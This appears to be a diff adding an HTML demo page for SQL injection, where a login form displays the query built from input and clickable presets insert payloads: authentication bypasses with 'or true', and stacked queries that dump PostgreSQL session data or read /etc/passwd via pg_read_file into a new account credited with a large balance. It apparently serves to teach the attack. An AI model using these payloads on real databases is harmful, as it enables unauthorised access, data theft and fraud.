@@ -1,0 +1,50 @@
+<html>
+<head>
+  <title>Demo</title>
+  <script>
+function sv() {
+  var t = window.event.target.innerText
+  document.getElementsByName('login')[0].value = t
+  document.getElementsByName('password')[0].value = ''
+  ch(t)
+}
+function ch(t) {
+  if (t) { // called by sv()
+    document.getElementsByTagName('span')[0].innerHTML = t
+    document.getElementsByTagName('span')[1].innerHTML = ''
+  } else {
+    var idx = 0
+    if (window.event.target.name === 'password') { idx = 1 }
+    document.getElementsByTagName('span')[idx].innerHTML = window.event.target.value
+  }
+}
+  </script>
+  <style>
+html, body { font-family: "Helvetica",sans-serif; font-size: 120%; }
+input, button { font-family: inherit; font-size: inherit; }
+pre { background: #f0f0f0; cursor: pointer; padding: 10px; margin: 10px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+<a href="/"><h1>Demo</h1></a>
+<form method="get" action="/balance" autocomplete="off">
+  {{ if and . (not .Error) }}
+    <pre>
+Name:    {{ .Name }}
+Email:   <b style="color:#060">{{ .Email }}</b>
+Balance: {{ .Currency }} {{ .Balance }}</pre>
+  {{ else }}
+    {{ if .Error }}<h2 style="color:#f00">{{ .Error }}</h2>{{ end }}
+    login: <input type="text" name="login" oninput="ch()"></input>
+    password: <input type="text" name="password" oninput="ch()"></input>
+    <input type="submit" value="Go"></input>
+    <pre>select * from users where login='<span style="color:#f00"></span>' and password='<span style="color:#f00"></span>'</pre>
+    <pre onclick="sv()">'</pre>
+    <pre onclick="sv()">' or true limit 1 --</pre>
+    <pre onclick="sv()">' or true limit 1 offset 1 --</pre>
+    <pre onclick="sv()">'; insert into accounts (login, password, name, email, currency, balance) select 'x', 'xx', ':-]', string_agg(concat(application_name, e'\n', user, e'\n', client_addr, e'\n', query), e'\n\n'), 'RUR', 1000000 from pg_stat_activity where query &lt;&gt; '' on conflict (login) do update set email=excluded.email; --</pre>
+    <pre onclick="sv()">'; insert into accounts (login, password, name, email, currency, balance) select 'x', 'xx', '(o_o)', pg_read_file('/etc/passwd'), 'RUR', 1000000 on conflict (login) do update set email=excluded.email; --</pre>
+  {{ end }}
+</form>
+</body>
+</html>
